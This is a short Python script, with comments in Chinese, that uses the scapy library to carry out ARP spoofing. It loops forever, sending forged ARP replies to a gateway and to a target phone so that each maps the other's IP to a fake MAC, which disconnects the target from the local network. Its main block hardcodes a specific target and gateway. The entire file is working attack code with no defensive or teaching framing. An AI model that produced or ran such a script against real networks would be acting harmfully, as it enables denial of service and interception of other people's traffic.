from scapy.all import ARP, Ether, sendp
import time

def Disconnect(target_ip, target_mac, gateway_ip, gateway_mac, fake_mac, timebreak):
    target_mac = target_mac.replace("-", ":")
    gateway_mac = gateway_mac.replace("-", ":")
    fake_mac = fake_mac.replace("-", ":")
    while True:
        # 1. 欺骗网关：告诉网关 "target_ip 的 MAC 是 fake_mac"
        arp_to_gateway = Ether(dst=gateway_mac) / ARP(
            op=2,  
            psrc=target_ip,    
            pdst=gateway_ip,  
            hwdst=gateway_mac, 
            hwsrc=fake_mac     
        )
        # 2. 欺骗目标设备（手机）：告诉手机 "gateway_ip 的 MAC 是 fake_mac"
        arp_to_target = Ether(dst=target_mac) / ARP(
            op=2, 
            psrc=gateway_ip,  
            pdst=target_ip,   
            hwdst=target_mac, 
            hwsrc=fake_mac
        )
        # 发送双向欺骗包
        sendp(arp_to_gateway, verbose=False)
        sendp(arp_to_target, verbose=False)
        print(f"[+] 双向欺骗: 网关认为 {target_ip} 的MAC是 {fake_mac}, 目标认为网关({gateway_ip})的MAC是 {fake_mac}")
        time.sleep(timebreak)

if __name__ == "__main__":
    Disconnect("192.168.120.131", "0a-7f-47-af-c0-53", "192.168.120.1", "e0-5d-54-ce-c1-66","EC-2E-98-E2-B9-35",1)